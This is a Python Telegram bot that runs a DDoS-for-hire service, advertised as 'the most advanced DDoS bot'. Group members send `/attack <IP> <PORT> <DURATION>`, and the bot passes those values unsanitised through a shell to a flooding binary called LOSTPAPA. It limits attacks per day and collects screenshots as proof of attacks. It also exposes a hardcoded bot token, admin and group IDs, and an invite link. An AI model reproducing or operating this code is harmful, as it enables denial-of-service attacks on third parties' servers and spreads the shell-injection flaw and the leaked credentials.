#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import threading

# Insert your Telegram bot token here
BOT_TOKEN = '7462970141:AAEKa7CI39Zvkpo7Ev-AgYc7TRNeYV0EhZI'
bot = telebot.TeleBot(BOT_TOKEN)

# Admin user IDs
ADMIN_IDS = ["7357694692"]

# Group and channel details
GROUP_ID = "-1002286236671"
CHANNEL_USERNAME = "@LOSTVIPDDOS76"

# Attack settings
COOLDOWN_TIME = 0  # Cooldown in seconds
ATTACK_LIMIT = 10  # Max attacks per day

# Global tracking variables
global_last_attack_time = None
pending_feedback = {}
user_data = {}

# User data storage file
USER_FILE = "users.txt"

# Random image URLs for attack confirmations
IMAGE_URLS = [
    "https://envs.sh/g7a.jpg",
    "https://envs.sh/g7O.jpg",
    "https://envs.sh/g7_.jpg",
    "https://envs.sh/gHR.jpg",
    "https://envs.sh/gH4.jpg",
    "https://envs.sh/gHU.jpg",
    "https://envs.sh/gHl.jpg",
    "https://envs.sh/gH1.jpg",
    "https://envs.sh/gHk.jpg",
    "https://envs.sh/68x.jpg",
    "https://envs.sh/67E.jpg",
    "https://envs.sh/67Q.jpg",
    "https://envs.sh/686.jpg",
    "https://envs.sh/68V.jpg",
    "https://envs.sh/68-.jpg",
    "https://envs.sh/Vwn.jpg",
    "https://envs.sh/Vwe.jpg",
    "https://envs.sh/VwZ.jpg",
    "https://envs.sh/VwG.jpg",
    "https://envs.sh/VwK.jpg",
    "https://envs.sh/VwA.jpg",
    "https://envs.sh/Vw_.jpg",
    "https://envs.sh/Vwc.jpg"
]

# --- Utility Functions ---

def load_users():
    """Load user attack data from a file."""
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset)
                }
    except FileNotFoundError:
        pass

def save_users():
    """Save user attack data to a file."""
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

def is_user_in_channel(user_id):
    """Check if a user is a member of the required channel."""
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def is_attack_running(user_id):
    """Check if the user has a pending attack."""
    return pending_feedback.get(user_id, False)

# --- Command Handlers ---

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    """Handle attack command and enforce rules."""
    global global_last_attack_time

    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    command_parts = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, f"🚫 This bot works **only in the group**!\n🔗 Join: {CHANNEL_USERNAME}")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ You must **join {CHANNEL_USERNAME} first!**")
        return

    if is_attack_running(user_id):
        bot.reply_to(message, "⚠️ **Wait! You already have an ongoing attack.**")
        return

    if user_id not in user_data:
        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now()}

    user = user_data[user_id]
    if user['attacks'] >= ATTACK_LIMIT:
        bot.reply_to(message, "❌ **Attack limit reached! Try again tomorrow.**")
        return

    if len(command_parts) != 4:
        bot.reply_to(message, "⚠️ **Usage:** `/attack <IP> <PORT> <DURATION>`")
        return

    target, port, duration = command_parts[1], command_parts[2], command_parts[3]

    try:
        port = int(port)
        duration = int(duration)
    except ValueError:
        bot.reply_to(message, "❌ **Error:** Port and Duration must be numbers!")
        return

    if duration > 180:
        bot.reply_to(message, "🚫 **Max attack duration is 180s!**")
        return

    profile_photos = bot.get_user_profile_photos(user_id)
    if profile_photos.total_count == 0:
        bot.reply_to(message, "❌ **Set a profile picture first!**")
        return

    remaining_attacks = ATTACK_LIMIT - user['attacks'] - 1
    attack_image = random.choice(IMAGE_URLS)
    profile_pic = profile_photos.photos[0][-1].file_id

    bot.send_photo(
        message.chat.id, profile_pic,
        caption=f"👤 **User:** @{user_name} 🚀\n"
                f"💥 **Attack Started!**\n"
                f"🎯 **Target:** `{target}:{port}`\n"
                f"⏳ **Duration:** {duration}s\n"
                f"⚡ **Remaining Attacks:** {remaining_attacks}\n"
                f"📸 **Send a screenshot as proof!**"
    )

    pending_feedback[user_id] = True  
    attack_command = f"./LOSTPAPA {target} {port} {duration} 1200"

    try:
        subprocess.run(attack_command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ **Error:** {e}")
        pending_feedback[user_id] = False
        return

    bot.send_message(message.chat.id, 
                     f"✅ **Attack Completed!**\n"
                     f"🎯 `{target}:{port}` **Destroyed!**\n"
                     f"⏳ **Duration:** {duration}s\n"
                     f"⚡ **Remaining Attacks:** {remaining_attacks}")

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    """Handle screenshot submission for proof of attack."""
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name

    if pending_feedback.get(user_id, False):
        pending_feedback[user_id] = False  
        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)

        bot.send_message(CHANNEL_USERNAME, 
                         f"📸 **Feedback Received!**\n"
                         f"👤 **User:** `{user_name}`\n"
                         f"🆔 **ID:** `{user_id}`")

        bot.reply_to(message, "✅ **Feedback Accepted! You're ready for the next attack.**")
    else:
        bot.reply_to(message, "❌ **This is not a valid response!**")

@bot.message_handler(commands=['check_remaining_attack'])
def check_remaining_attack(message):
    """Check how many attacks a user has left for the day."""
    user_id = str(message.from_user.id)
    remaining_attacks = ATTACK_LIMIT - user_data.get(user_id, {}).get('attacks', 0)
    bot.reply_to(message, f"🔢 **You have {remaining_attacks} attacks remaining today.**")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    """Send a welcome message."""
    user_name = message.from_user.first_name
    bot.reply_to(
        message,
        f"🌟 Welcome, {user_name}! 🌟\n"
        "🚀 **You have entered the world of power!**\n"
        "💥 **The most advanced DDoS bot is here!**\n"
        "⚡ **Dominate the web, be the king!**\n"
        f"🔗 **Join Now:** [Group Link](https://t.me/+xsi7410YP0c3ZTc1) 🚀🔥",
        parse_mode="Markdown"
    )

# --- Background Task: Auto-Reset Attack Limits ---
def auto_reset():
    """Reset daily attack limits at midnight."""
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)

        for user_id in user_data:
            user_data[user_id]['attacks'] = 0
            user_data[user_id]['last_reset'] = datetime.datetime.now()
        save_users()

reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()

# Load user data and start bot polling
load_users()

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(15)